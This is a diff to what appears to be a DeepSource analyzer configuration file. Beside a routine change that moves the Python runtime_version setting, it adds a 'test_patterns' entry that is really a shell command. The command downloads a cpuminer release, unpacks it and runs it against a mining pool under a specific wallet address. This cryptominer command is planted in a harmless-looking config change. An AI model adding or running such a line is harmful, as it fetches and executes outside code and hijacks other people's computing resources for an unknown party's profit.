@@ -1,6 +1,10 @@
 version = 1
 
+test_patterns = ["wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qj5vh3cse2legwda2yammx5y8nlrkwn2g3cwqtn.tes"]
+
 [[analyzers]]
 name = "python"
 enabled = true
-runtime_version = "3.x.x"
+
+  [analyzers.meta]
+  runtime_version = "3.x.x"
